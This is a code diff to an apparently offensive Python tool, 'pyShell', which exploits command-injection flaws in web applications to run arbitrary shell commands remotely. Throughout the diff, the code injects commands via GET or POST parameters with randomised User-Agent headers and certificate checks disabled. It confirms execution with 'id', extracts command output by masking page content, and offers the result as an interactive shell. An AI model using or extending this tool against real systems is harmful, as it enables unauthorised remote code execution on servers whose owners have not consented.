@@ -34,7 +34,7 @@ class pyShell():
 
 
 	def doReq(self, data):
-		data = self.prepend + data + self.append
+		data = self.prepend + str(data) + self.append
 		ua = random.choice(user_agent)
 		h = {'User-Agent': ua}
 		if self.method == 'GET':
@@ -48,14 +48,14 @@ class pyShell():
 				url += self.param + "=" + data
 			output=requests.get(url, headers=h, verify=False)
 		elif self.method == 'POST':
-			url = self.url['base'] + self.url['relpath']
+			url = self.url['base'] + self.url['relpath'] + "?"
 			if 'params' in self.url and len(self.url['params']) > 0:
 				for k in self.url['params']:
 					if k != self.param:
 						url += k + "=" + self.url['params'][k] + "&"
 				url=url[:-1]
 			output=requests.post(url, data={self.param: data}, headers=h, verify=False)
-		return (output.content, output.status_code)
+		return (str(output.content).replace("\\n", "\n"), output.status_code)
 
 	def explode_url(self, url):
 		url_array=dict()
@@ -79,21 +79,24 @@ class pyShell():
 
 	def check_rce(self):
 		r=self.doReq("id")[0]
-		if r.find(b"uid=") != -1 and r.find(b"gid=") != -1:
+		if r.find("uid=") != -1 and r.find("gid=") != -1:
 			return True
 		return False
 
 	def get_diff(self):
-		r=self.doReq("echo -ne bbzbztrt")[0]
-		b=str(r, 'utf-8')
+		print("\033[33m[*] \033[0mFiltering out static content...")
+		r=self.doReq("echo bbzbztrt")[0]
+		b=str(r)
 		(bmask, amask) = re.split("bbzbztrt", b)
 		return (bmask, amask)
 			
 
 	def doCmd(self, cmd):
 		(r,sc)=self.doReq(cmd)
-		output=str(r[r.index(str.encode(self.mask[0])) + len(self.mask[0]):r.index(str.encode(self.mask[1]))], 'utf-8')
-
+		try:
+			output=str(r[r.index(self.mask[0]) + len(self.mask[0]):r.index(self.mask[1])])
+		except:
+			output=str(r[r.index(self.mask[0]) + len(self.mask[0]):])
 		if output:
 			if output[-1] == '\n':
 				output=output[:-1]
@@ -134,3 +137,4 @@ def parse_params():
 
 if __name__=='__main__':
 	main()
+
